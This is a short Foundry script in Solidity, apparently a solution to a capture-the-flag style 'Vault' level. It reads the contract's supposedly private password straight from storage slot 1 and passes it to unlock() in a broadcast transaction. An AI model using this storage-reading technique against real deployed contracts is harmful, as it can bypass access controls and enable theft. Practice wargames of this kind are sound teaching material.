// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel08.sol";

contract Attacker is Script {
    Vault level08 = Vault(0xc8cF15a497D7a670369A5b26E15810d2e6A97373);

    function run() external {
        vm.startBroadcast();

        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.unlock(password);

        vm.stopBroadcast();
    }
}
